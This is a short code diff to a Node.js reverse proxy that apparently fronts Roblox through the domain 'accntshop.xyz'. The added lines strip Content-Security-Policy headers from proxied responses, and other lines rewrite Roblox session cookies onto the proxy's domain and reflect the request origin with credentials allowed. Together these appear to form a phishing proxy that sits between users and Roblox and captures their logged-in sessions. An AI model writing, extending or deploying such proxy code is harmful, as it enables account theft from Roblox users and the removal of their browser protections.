@@ -1068,6 +1068,11 @@ function createRobloxProxy(prefix, target) {
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                 }
                 
+                // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
+                delete proxyRes.headers['content-security-policy'];
+                delete proxyRes.headers['content-security-policy-report-only'];
+                delete proxyRes.headers['x-content-security-policy'];
+                
                 const origin = req.headers['origin'] || `https://${req.headers.host}`;
                 proxyRes.headers['access-control-allow-origin'] = origin;
                 proxyRes.headers['access-control-allow-credentials'] = 'true';
@@ -1120,11 +1125,16 @@ app.use('/', createProxyMiddleware({
         },
 
         proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
+            // CRITICAL: Strip CSP headers so browser doesn't block proxy URLs
+            delete proxyRes.headers['content-security-policy'];
+            delete proxyRes.headers['content-security-policy-report-only'];
+            delete proxyRes.headers['x-content-security-policy'];
+            
             // CRITICAL: Rewrite cookies for initial page load
             const host = req.headers.host || 'accntshop.xyz';
             if (proxyRes.headers['set-cookie']) {
                 proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
-                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies to domain: .${host}`);
+                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies to domain: .${host.replace(/^www\./, '')}`);
             }
 
             // Set CORS headers
